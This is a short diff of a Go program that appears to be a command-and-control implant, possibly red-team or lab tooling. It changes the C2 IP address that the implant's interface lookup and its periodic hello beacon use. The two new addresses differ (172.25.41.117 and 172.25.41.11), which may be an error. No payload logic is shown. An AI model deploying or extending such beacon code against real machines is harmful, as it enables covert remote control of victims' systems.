@@ -434,7 +434,7 @@ func main() {
 	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := GetOutwardIface("10.96.239.7:80")
+	iface, src := GetOutwardIface("172.25.41.117:80")
 	fmt.Println("[+] Using interface:", iface.Name)
 
 	dstMAC, err := GetRouterMAC()
@@ -447,7 +447,7 @@ func main() {
 	// Start hello timer
 	// Set the below IP to the IP of the C2
 	// 192.168.4.6
-	go sendHello(iface, src, net.IPv4(10, 96, 239, 7), dstMAC)
+	go sendHello(iface, src, net.IPv4(172, 25, 41, 11), dstMAC)
 
 	// Listen for responses
 	fmt.Println("[+] Listening")
